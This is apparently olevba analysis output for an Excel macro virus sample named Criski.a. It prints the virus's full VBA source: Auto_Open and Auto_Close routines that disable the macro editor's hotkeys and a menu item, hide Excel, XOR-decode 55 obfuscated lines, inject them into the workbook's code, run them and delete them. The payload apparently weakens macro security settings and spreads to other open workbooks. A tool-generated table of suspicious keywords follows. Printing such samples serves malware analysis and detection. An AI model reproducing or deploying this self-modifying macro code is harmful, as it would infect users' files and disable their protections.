olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Criski.a.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ЭтаКнига.cls 
in file: Virus.MSExcel.Criski.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ЭтаКнига'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: Virus.MSExcel.Criski.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: Virus.MSExcel.Criski.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: Virus.MSExcel.Criski.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO arrSKIJ.bas 
in file: Virus.MSExcel.Criski.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/arrSKIJ'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'===================================='
   '==========SKIJ.Crypt=========='
'================2005================'
Option Explicit
Dim objReg As Object
Dim blnOpw As Boolean
Dim intI As Integer
Dim intJ As Integer
Dim intK As Integer
Dim intN As Integer
Dim strArf As String
Dim strRfn As String
Dim strSdc As String
Dim strLdc As String
Dim arrCrp(54)
Sub Auto_Open()
On Error Resume Next
CommandBars("Tools").Controls(13).Enabled = False
Application.OnKey "%{F8}", ""
Application.OnKey "%{F11}", ""
End Sub
Sub Auto_Close()
On Error Resume Next
Application.EnableCancelKey = xlDisabled
Application.Visible = False
arrCrp(0) = "©џЋЪ•�ђЁџќЪЗЪ№€џ›Ћџµ�ђџ™ЋТШ­‰™€“ЉЋФ©’џ––ШУ"
arrCrp(1) = "­“Ћ’Ъ•�ђЁџќ"
arrCrp(2) = "ФЁџќ­€“ЋџЪШІ±№Ї¦©•њЋЌ›€џ¦·“™€•‰•њЋ¦µњњ“™џ¦ГФК¦ї‚™џ–¦©џ™Џ€“Ћѓ¦¶џЊџ–ШЦЪЛЦЪШЁїЅҐѕ­µЁѕШ"
arrCrp(3) = "ФЁџќ­€“ЋџЪШІ±№Ї¦©•њЋЌ›€џ¦·“™€•‰•њЋ¦µњњ“™џ¦ЛКФК¦ї‚™џ–¦©џ™Џ€“Ћѓ¦¶џЊџ–ШЦЪЛЦЪШЁїЅҐѕ­µЁѕШ"
arrCrp(4) = "ФЁџќ­€“ЋџЪШІ±№Ї¦©•њЋЌ›€џ¦·“™€•‰•њЋ¦µњњ“™џ¦ЛКФК¦ї‚™џ–¦©џ™Џ€“Ћѓ¦»™™џ‰‰¬ёµ·ШЦЪЛЦЪШЁїЅҐѕ­µЁѕШ"
arrCrp(5) = "ФЁџќ­€“ЋџЪШІ±№Ї¦©•њЋЌ›€џ¦·“™€•‰•њЋ¦µњњ“™џ¦ЛЛФК¦ї‚™џ–¦©џ™Џ€“Ћѓ¦¶џЊџ–ШЦЪЛЦЪШЁїЅҐѕ­µЁѕШ"
arrCrp(6) = "ФЁџќ­€“ЋџЪШІ±№Ї¦©•њЋЌ›€џ¦·“™€•‰•њЋ¦µњњ“™џ¦ЛЛФК¦ї‚™џ–¦©џ™Џ€“Ћѓ¦»™™џ‰‰¬ёµ·ШЦЪЛЦЪШЁїЅҐѕ­µЁѕШ"
arrCrp(7) = "ї”ћЪ­“Ћ’"
arrCrp(8) = "ј•€Ъ“”ЋіЪЗЪИЪ®•Ъ»ЉЉ–“™›Ћ“•”ФЁџ™џ”Ћј“–џ‰Ф№•Џ”Ћ"
arrCrp(9) = "‰Ћ€»€њЪЗЪ»ЉЉ–“™›Ћ“•”ФЁџ™џ”Ћј“–џ‰ФіЋџ—Т“”ЋіУФЄ›Ћ’"
arrCrp(10) = "©џЋ»ЋЋ€ЪТ‰Ћ€»€њУЦЪЊ�ґ•€—›–"
arrCrp(11) = "�–”µЉЌЪЗЪј›–‰џ"
arrCrp(12) = "ј•€Ъ“”Ћ°ЪЗЪЛЪ®•Ъ­•€‘�••‘‰Ф№•Џ”Ћ"
arrCrp(13) = "іњЪЁ“ќ’ЋТ‰Ћ€»€њЦЪ¶џ”Т­•€‘�••‘‰Т“”Ћ°УФґ›—џУУЪЗЪ­•€‘�••‘‰Т“”Ћ°УФґ›—џЪ®’џ”"
arrCrp(14) = "�–”µЉЌЪЗЪ®€Џџ"
arrCrp(15) = "ї”ћЪіњ"
arrCrp(16) = "ґџ‚ЋЪ“”Ћ°"
arrCrp(17) = "іњЪ�–”µЉЌЪЗЪј›–‰џЪ®’џ”"
arrCrp(18) = "“”Ћ±ЪЗЪЛ"
arrCrp(19) = "“”ЋґЪЗЪ¶џ”Т‰Ћ€»€њУЪЧЪЛ"
arrCrp(20) = "ј•€Ъ“”Ћ°ЪЗЪЛЪ®•Ъ¶џ”Т‰Ћ€»€њУ"
arrCrp(21) = "іњЪ·“ћТ‰Ћ€»€њЦЪ“”ЋґЦЪЛУЪЖДЪШ¦ШЪ®’џ”"
arrCrp(22) = "“”Ћ±ЪЗЪ“”Ћ±ЪСЪЛ"
arrCrp(23) = "“”ЋґЪЗЪ“”ЋґЪЧЪЛ"
arrCrp(24) = "ї–‰џ"
arrCrp(25) = "Ѕ•®•ЪЁњґ—"
arrCrp(26) = "ї”ћЪіњ"
arrCrp(27) = "ґџ‚ЋЪ“”Ћ°"
arrCrp(28) = "Ёњґ—А"
arrCrp(29) = "‰Ћ€Ёњ”ЪЗЪЁ“ќ’ЋТ‰Ћ€»€њЦЪ“”Ћ±У"
arrCrp(30) = "­•€‘�••‘‰ФµЉџ”ЪТ‰Ћ€»€њУ"
arrCrp(31) = "ї”ћЪіњ"
arrCrp(32) = "ј•€Ъ“”Ћ°ЪЗЪЛЪ®•Ъ­•€‘�••‘‰Ф№•Џ”Ћ"
arrCrp(33) = "іњЪ­•€‘�••‘‰Т“”Ћ°УФ¬ёЄ€•ђџ™ЋФґ›—џЪЖДЪШ¬ёЄ€•ђџ™ЋШЪ®’џ”"
arrCrp(34) = "іњЪ­•€‘�••‘‰Т“”Ћ°УФ·•ћЏ–џ‰Ф№•Џ”ЋЪДЪКЪ®’џ”"
arrCrp(35) = "­•€‘�••‘‰Т“”Ћ°УФ·•ћЏ–џ‰ТЛУФґ›—џЪЗЪШ›€€©±і°Ш"
arrCrp(36) = "ї–‰џ"
arrCrp(37) = "­•€‘�••‘‰Т“”Ћ°УФ·•ћЏ–џ‰Ф»ћћ"
arrCrp(38) = "­•€‘�••‘‰Т“”Ћ°УФ·•ћЏ–џ‰ТЛУФґ›—џЪЗЪШ›€€©±і°Ш"
arrCrp(39) = "ї”ћЪіњ"
arrCrp(40) = "ї”ћЪіњ"
arrCrp(41) = "ґџ‚ЋЪ“”Ћ°"
arrCrp(42) = "ј•€Ъ“”Ћ°ЪЗЪЛЪ®•Ъ»ЉЉ–“™›Ћ“•”Ф¬ёїФ¬ёЄ€•ђџ™Ћ‰Ф№•Џ”Ћ"
arrCrp(43) = "­“Ћ’Ъ»ЉЉ–“™›Ћ“•”Ф¬ёїФ¬ёЄ€•ђџ™Ћ‰ТШ¬ё»Є€•ђџ™ЋШУ"
arrCrp(44) = "Ф¬ё№•—Љ•”џ”Ћ‰ТШ›€€©±і°ШУФ№•ћџ·•ћЏ–џФѕџ–џЋџ¶“”џ‰ЪЛЦЪҐ"
arrCrp(45) = "»ЉЉ–“™›Ћ“•”Ф¬ёїФ¬ёЄ€•ђџ™Ћ‰ТШ¬ё»Є€•ђџ™ЋШУФ¬ё№•—Љ•”џ”Ћ‰ТШ›€€©±і°ШУФ№•ћџ·•ћЏ–џФ№•Џ”Ћµњ¶“”џ‰"
arrCrp(46) = "Ф¬ё№•—Љ•”џ”Ћ‰ТШ›€€©±і°ШУФ№•ћџ·•ћЏ–џФі”‰џ€Ћ¶“”џ‰ЪЛЦЪҐ"
arrCrp(47) = "»ЉЉ–“™›Ћ“•”Ф¬ёїФ¬ёЄ€•ђџ™Ћ‰ТШ¬ёЄ€•ђџ™ЋШУФ¬ё№•—Љ•”џ”Ћ‰ТШ›€€©±і°ШУФ№•ћџ·•ћЏ–џФ¶“”џ‰ТЛЦЪЛККУ"
arrCrp(48) = "Ф¬ё№•—Љ•”џ”Ћ‰ТШ›€€©±і°ШУФ№•ћџ·•ћЏ–џФі”‰џ€Ћ¶“”џ‰ЪЛКЛЦЪШї”ћЪ©Џ�Ш"
arrCrp(49) = "Фґ›—џЪЗЪШ¬ёЄ€•ђџ™ЋШ"
arrCrp(50) = "ї”ћЪ­“Ћ’"
arrCrp(51) = "ґџ‚ЋЪ“”Ћ°"
arrCrp(52) = "­•€‘�••‘‰Т‰Ћ€Ёњ”УФ©›Њџ"
arrCrp(53) = "­•€‘�••‘‰Т‰Ћ€Ёњ”УФ№–•‰џ"
arrCrp(54) = "ґџ‚ЋЪ“”Ћі"
Dec
For intJ = 1 To Workbooks.Count
    Workbooks(intJ).Save
Next intJ
End Sub
Private Sub Dec()
On Error Resume Next
For intI = 0 To 54
    For intJ = 1 To Len(arrCrp(intI))
        strSdc = Chr(Asc(Mid(arrCrp(intI), intJ, 1)) Xor 250)
        strLdc = strLdc + strSdc
    Next intJ
    ActiveWorkbook.VBProject.VBComponents("arrSKIJ").CodeModule.InsertLines (101 + intI), strLdc
    strLdc = Empty
Next intI
Arr
ActiveWorkbook.VBProject.VBComponents("arrSKIJ").CodeModule.DeleteLines 101, 55
End Sub
Private Sub Arr()
On Error Resume Next
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  arrSKI
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

